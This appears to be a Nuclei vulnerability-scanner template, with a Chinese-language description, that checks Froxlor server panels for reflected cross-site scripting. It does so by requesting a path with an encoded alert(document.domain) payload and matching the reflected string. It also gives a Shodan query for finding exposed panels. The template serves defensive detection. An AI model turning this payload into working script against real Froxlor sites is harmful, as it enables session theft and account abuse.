id: froxlor-xss

info:
  name: Froxlor Server Management - 跨站脚本漏洞
  author: tess
  severity: medium
  description: |
    该模板用于检测 Froxlor Server Management - 跨站脚本漏洞。该类漏洞通常源于页面未对用户输入进行正确过滤或输出编码，导致脚本内容被浏览器执行。模板主要向 `/index.php/javascript%26colon%3Balert(document.domain);dd%26sol%3b%26sol%3b` 等路径发送探测请求，并根据响应中的 `javascript&colon;alert(document.domain);dd&sol;&sol;`、`Froxlor` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可诱导用户访问构造链接或页面，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、执行越权操作、篡改页面内容，或作为钓鱼和横向攻击链的一环。
  remediation: |
    - 对所有反射或存储到页面的用户输入进行上下文相关输出编码。
    - 对富文本、URL、HTML 属性等高风险输入使用白名单过滤，并启用合适的 Content-Security-Policy。
    - 升级受影响组件，检查是否存在被植入的恶意脚本或异常后台操作。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
    cpe: cpe:2.3:a:froxlor:froxlor:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Froxlor Server Management Panel"
    product: froxlor
    vendor: froxlor
  tags: froxlor,xss,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/index.php/javascript%26colon%3Balert(document.domain);dd%26sol%3b%26sol%3b'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "javascript&colon;alert(document.domain);dd&sol;&sol;"
          - "Froxlor"
        condition: and

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
